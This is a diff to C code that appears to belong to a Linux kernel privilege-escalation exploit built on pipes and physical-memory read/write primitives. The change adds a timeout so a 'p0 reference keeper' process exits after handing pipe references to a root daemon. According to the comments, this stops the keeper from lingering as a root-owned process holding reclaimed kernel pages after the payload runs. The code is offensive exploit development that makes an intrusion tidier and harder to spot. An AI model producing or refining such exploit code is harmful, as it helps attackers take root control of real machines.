@@ -6,6 +6,14 @@
 
 #define PIPE_SHAPE_ROUNDS 0
 #define PHYSRW_PROOF_OFF 0x7000
+/*
+ * Upper bound on how long the p0 reference keeper waits for the root daemon to
+ * accept the retained pipe read ends.  Without it the keeper spun forever and
+ * survived the payload as a root-owned process holding reclaimed kernel pages.
+ */
+#ifndef KEEP_HOLD_TIMEOUT_SEC
+#define KEEP_HOLD_TIMEOUT_SEC 120
+#endif
 #define PHYS_READ_TAG "nebusec_70687973727730"
 #define PHYS_WRITE_TAG "nebusec_70687973727731"
 #define PHYS64_SEED 0x306365737562656eULL
@@ -998,13 +1006,24 @@ void spawn_p0_ref_keeper(int retained_pipe_index) {
       }
     }
   }
+  /*
+   * The keeper must not live forever.  With retained_pipe_index < 0 every
+   * pipe was just closed above, so this process holds nothing at all: pausing
+   * here only leaked a root-owned process for the rest of the boot.  With a
+   * valid index the read ends are still held, so give the hand-off to the root
+   * daemon a bounded window and then release them instead of spinning.
+   * KEEP_HOLD_TIMEOUT_SEC is generous enough for a slow root daemon start.
+   */
   if (retained_pipe_index < 0) {
-    for (;;) {
-      pause();
-    }
+    _exit(0);
   }
+  size_t deadline_ns =
+      gettime_ns() + (uint64_t)KEEP_HOLD_TIMEOUT_SEC * 1000000000ULL;
   for (;;) {
     if (transfer_p0_references_to_root(retained_pipe_index)) {
+      _exit(0);
+    }
+    if (gettime_ns() >= deadline_ns) {
       _exit(0);
     }
     usleep(10000);
